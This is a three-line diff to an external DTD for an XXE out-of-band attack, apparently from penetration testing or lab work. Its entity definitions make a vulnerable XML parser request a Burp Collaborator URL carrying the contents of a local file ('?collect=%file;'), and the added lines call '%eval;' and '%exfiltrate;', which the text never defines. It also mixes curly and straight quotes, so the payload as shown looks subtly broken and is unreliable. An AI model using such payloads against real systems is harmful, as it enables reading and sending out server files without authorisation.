@@ -1,1 +1,3 @@
-<!ENTITY % all "<!ENTITY send SYSTEM ‘http://sd9tdtttprlpc44sdrz021fvym4cs1.burpcollaborator.net/?collect=%file;'>"> %all;
+<!ENTITY % all "<!ENTITY send SYSTEM ‘http://sd9tdtttprlpc44sdrz021fvym4cs1.burpcollaborator.net/?collect=%file;'>"> 
+%eval;
+%exfiltrate;
